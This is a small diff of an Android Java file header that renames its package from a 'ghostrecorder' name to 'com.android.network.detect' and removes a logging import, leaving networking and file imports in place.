@@ -1,11 +1,10 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 
 import android.content.Context;
 import android.content.ContextWrapper;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
-import android.util.Log;
 
 import java.io.File;
 import java.io.IOException;
